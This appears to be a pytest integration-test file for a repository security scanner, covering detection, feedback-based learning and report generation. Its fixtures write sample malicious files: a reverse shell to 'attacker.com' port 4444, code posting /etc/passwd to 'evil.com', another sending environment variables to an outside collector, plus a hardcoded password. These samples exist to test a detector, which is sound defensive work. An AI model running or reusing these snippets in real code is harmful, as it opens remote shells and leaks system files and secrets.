"""
Integration Tests for Complete Scanning Workflow

Tests the entire workflow from scanning to feedback to report generation.
"""

import pytest
import tempfile
import json
from pathlib import Path
from src.core.security.malicious_intent_detection import analyze_malicious_intent
from src.core.learning.learning_system import LearningSystem
from src.core.quality.enhanced_report_generator import EnhancedReportGenerator


class TestCompleteWorkflow:
    """Test complete end-to-end workflow."""
    
    @pytest.fixture
    def temp_repo(self):
        """Create temporary test repository."""
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = Path(tmpdir) / "test_repo"
            repo_path.mkdir()
            
            # Create test files
            (repo_path / "app.py").write_text("""
import os
import requests

def deploy():
    # Hardcoded admin password
    if password == 'admin123':
        return True
    
    # Send environment variables
    requests.post('https://collector.com', data=os.environ)
    
    return False
""")
            
            (repo_path / "safe.py").write_text("""
def calculate(x, y):
    return x + y

def process_data(items):
    return [item * 2 for item in items]
""")
            
            yield repo_path
    
    @pytest.fixture
    def temp_learning(self):
        """Create temporary learning system."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "learning.db"
            learning = LearningSystem(db_path)
            yield learning
    
    def test_scan_to_report_workflow(self, temp_repo):
        """Test complete workflow from scan to report."""
        # 1. Scan repository for malicious intent
        repository_files = {}
        for py_file in temp_repo.glob("*.py"):
            repository_files[str(py_file)] = py_file.read_text()
        
        malicious_analysis = analyze_malicious_intent(repository_files)
        
        # Should detect malicious patterns
        assert malicious_analysis['total_detections'] > 0
        assert malicious_analysis['malicious_intent_detected'] is True
        
        # 2. Create mock security analysis
        security_analysis = {
            'patterns_by_language': {
                'python': [
                    {
                        'pattern_id': 'SEC_001',
                        'type': 'hardcoded_secret',
                        'severity': 'critical',
                        'confidence': 0.90,
                        'file': str(temp_repo / 'app.py'),
                        'line': 6,
                        'evidence': "if password == 'admin123':",
                        'description': 'Hardcoded admin password',
                        'impact': 'Unauthorized access',
                        'remediation': 'Use environment variables'
                    }
                ]
            }
        }
        
        # 3. Generate comprehensive results
        analysis_results = {
            'security_analysis': security_analysis,
            'malicious_intent': malicious_analysis,
            'documentation_analysis': {'accuracy_score': 0.5},
            'governance_signals': {
                'has_ci': False,
                'has_tests': False,
                'has_readme': False
            }
        }
        
        # 4. Generate enhanced report
        generator = EnhancedReportGenerator()
        report = generator.generate_report(analysis_results, str(temp_repo))
        
        # Verify report content
        assert 'CRITICAL' in report or 'HIGH' in report
        assert 'Malicious' in report or 'malicious' in report
        assert 'admin123' in report or 'hardcoded' in report.lower()
        assert 'Recommendations' in report
    
    def test_feedback_learning_cycle(self, temp_learning):
        """Test feedback and learning improvement cycle."""
        learning = temp_learning
        
        # 1. Record initial scan with findings
        scan_results = {
            'security_analysis': {
                'patterns_by_language': {
                    'python': [
                        {
                            'pattern_id': 'TEST_001',
                            'type': 'test_pattern',
                            'severity': 'high',
                            'confidence': 0.75,
                            'file': 'test.py',
                            'line': 10,
                            'evidence': 'test_code()',
                            'description': 'Test finding'
                        }
                    ]
                }
            }
        }
        
        learning.record_scan_result('scan_001', '/test/repo', scan_results)
        
        # 2. Get finding ID
        findings = learning.db.get_findings_by_scan('scan_001')
        assert len(findings) == 1
        finding_id = findings[0].finding_id
        
        # 3. Submit false positive feedback
        learning.submit_feedback(finding_id, 'FP', 'This is test code')
        
        # 4. Verify pattern statistics updated
        stats = learning.db.get_pattern_stats('TEST_001')
        assert stats.total_reports == 1
        assert stats.false_positives == 1
        assert stats.false_positive_rate == 1.0
        
        # 5. Record more scans with mixed feedback
        for i in range(2, 12):  # 10 more scans
            learning.record_scan_result(
                f'scan_{i:03d}',
                f'/test/repo{i}',
                scan_results
            )
            findings = learning.db.get_findings_by_scan(f'scan_{i:03d}')
            
            # 7 TP, 3 more FP (total 4 FP out of 11)
            classification = 'FP' if i <= 4 else 'TP'
            learning.submit_feedback(findings[0].finding_id, classification)
        
        # 6. Check updated statistics
        stats = learning.db.get_pattern_stats('TEST_001')
        assert stats.total_reports == 11
        assert stats.false_positives == 4
        assert abs(stats.false_positive_rate - 4/11) < 0.01
        
        # 7. Get adjusted confidence (should be lower due to FPs)
        adjusted_conf = learning.get_adjusted_confidence('TEST_001')
        assert adjusted_conf < 0.75  # Should be lower than base
        
        # 8. Generate improvement report
        report = learning.generate_improvement_report()
        assert 'TEST_001' in str(report)
    
    def test_malicious_repo_complete_analysis(self, temp_repo):
        """Test complete analysis of repository with malicious code."""
        # Create malicious files
        (temp_repo / "backdoor.py").write_text("""
import socket
import subprocess

# Reverse shell backdoor
s = socket.socket()
s.connect(('attacker.com', 4444))
subprocess.Popen(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno())
""")
        
        (temp_repo / "exfiltrate.py").write_text("""
import requests

# Exfiltrate system files
with open('/etc/passwd', 'r') as f:
    requests.post('https://evil.com/collect', data=f.read())
""")
        
        # Scan all files
        repository_files = {}
        for py_file in temp_repo.glob("*.py"):
            repository_files[str(py_file)] = py_file.read_text()
        
        # Analyze
        malicious_analysis = analyze_malicious_intent(repository_files)
        
        # Should detect multiple serious issues
        assert malicious_analysis['malicious_intent_detected'] is True
        assert malicious_analysis['overall_risk'] in ['CRITICAL', 'HIGH']
        assert malicious_analysis['risk_score'] >= 7.0
        
        # Should detect multiple categories
        assert len(malicious_analysis['by_category']) >= 2
        
        # Should have top threats
        assert len(malicious_analysis['top_threats']) > 0
        
        # Generate report with this data
        analysis_results = {
            'security_analysis': {'patterns_by_language': {}},
            'malicious_intent': malicious_analysis
        }
        
        generator = EnhancedReportGenerator()
        report = generator.generate_report(analysis_results, str(temp_repo))
        
        # Report should reflect critical risk
        assert 'CRITICAL' in report
        assert 'IMMEDIATE ACTION' in report or 'Do not deploy' in report.lower()
        assert 'backdoor' in report.lower() or 'reverse shell' in report.lower()
    
    def test_clean_repo_analysis(self, temp_repo):
        """Test analysis of clean repository."""
        # Only keep safe file
        for py_file in temp_repo.glob("*.py"):
            if py_file.name != "safe.py":
                py_file.unlink()
        
        # Scan
        repository_files = {
            str(temp_repo / "safe.py"): (temp_repo / "safe.py").read_text()
        }
        
        malicious_analysis = analyze_malicious_intent(repository_files)
        
        # Should be clean
        assert malicious_analysis['malicious_intent_detected'] is False
        assert malicious_analysis['overall_risk'] == 'LOW'
        assert malicious_analysis['risk_score'] <= 3.0
        
        # Generate report
        analysis_results = {
            'security_analysis': {'patterns_by_language': {}},
            'malicious_intent': malicious_analysis,
            'governance_signals': {
                'has_ci': True,
                'has_tests': True,
                'has_readme': True
            }
        }
        
        generator = EnhancedReportGenerator()
        report = generator.generate_report(analysis_results, str(temp_repo))
        
        # Report should reflect low risk
        assert 'LOW' in report
        assert 'APPROVED' in report or 'safe' in report.lower()


class TestRealWorldScenarios:
    """Test real-world usage scenarios."""
    
    @pytest.fixture
    def temp_repo(self):
        """Create temporary test repository."""
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = Path(tmpdir) / "test_repo"
            repo_path.mkdir()
            yield repo_path
    
    def test_multiple_scans_same_repo(self, temp_repo):
        """Test multiple scans of same repository with improvements."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "learning.db"
            learning = LearningSystem(db_path)
            
            # Initial scan with vulnerability
            vuln_code = """
def authenticate(password):
    if password == 'admin123':  # Hardcoded password
        return True
    return check_database(password)
"""
            (temp_repo / "auth.py").write_text(vuln_code)
            
            scan_results = {
                'security_analysis': {
                    'patterns_by_language': {
                        'python': [
                            {
                                'pattern_id': 'SEC_HARDCODED',
                                'type': 'hardcoded_secret',
                                'severity': 'critical',
                                'confidence': 0.95,
                                'file': 'auth.py',
                                'line': 2,
                                'evidence': "if password == 'admin123':",
                                'description': 'Hardcoded password'
                            }
                        ]
                    }
                }
            }
            
            # Scan 1: Initial vulnerable state
            learning.record_scan_result('scan_v1', str(temp_repo), scan_results)
            findings = learning.db.get_findings_by_scan('scan_v1')
            assert len(findings) == 1
            learning.submit_feedback(findings[0].finding_id, 'TP', 'Real vulnerability')
            
            # Fix the vulnerability
            fixed_code = """
import os

def authenticate(password):
    admin_password = os.getenv('ADMIN_PASSWORD')
    if password == admin_password:
        return True
    return check_database(password)
"""
            (temp_repo / "auth.py").write_text(fixed_code)
            
            # Scan 2: After fix
            clean_results = {
                'security_analysis': {
                    'patterns_by_language': {
                        'python': []
                    }
                }
            }
            
            learning.record_scan_result('scan_v2', str(temp_repo), clean_results)
            findings_v2 = learning.db.get_findings_by_scan('scan_v2')
            assert len(findings_v2) == 0  # No findings after fix
    
    def test_pattern_confidence_evolution(self):
        """Test how pattern confidence evolves with feedback."""
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "learning.db"
            learning = LearningSystem(db_path)
            
            pattern_id = 'EVOLVING_PATTERN'
            base_confidence = 0.70
            
            # Simulate 30 scans with gradually improving accuracy
            # First 10: 50% accuracy (learning phase)
            # Next 10: 80% accuracy (improving)
            # Last 10: 95% accuracy (mature)
            
            for phase in range(3):
                accuracy = [0.5, 0.8, 0.95][phase]
                tp_count = int(10 * accuracy)
                
                for i in range(10):
                    scan_id = f'scan_{phase}_{i}'
                    results = {
                        'security_analysis': {
                            'patterns_by_language': {
                                'python': [
                                    {
                                        'pattern_id': pattern_id,
                                        'type': 'test',
                                        'severity': 'medium',
                                        'confidence': base_confidence,
                                        'file': f'file_{phase}_{i}.py',
                                        'line': i,
                                        'evidence': 'code',
                                        'description': 'Test'
                                    }
                                ]
                            }
                        }
                    }
                    
                    learning.record_scan_result(scan_id, f'/repo{phase}{i}', results)
                    findings = learning.db.get_findings_by_scan(scan_id)
                    
                    classification = 'TP' if i < tp_count else 'FP'
                    learning.submit_feedback(findings[0].finding_id, classification)
            
            # Check final statistics
            stats = learning.db.get_pattern_stats(pattern_id)
            assert stats.total_reports == 30
            
            # Overall accuracy should be around 75% (5+8+9.5)/30
            expected_accuracy = (5 + 8 + 9.5) / 30
            actual_accuracy = stats.true_positives / stats.total_reports
            assert abs(actual_accuracy - expected_accuracy) < 0.1


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
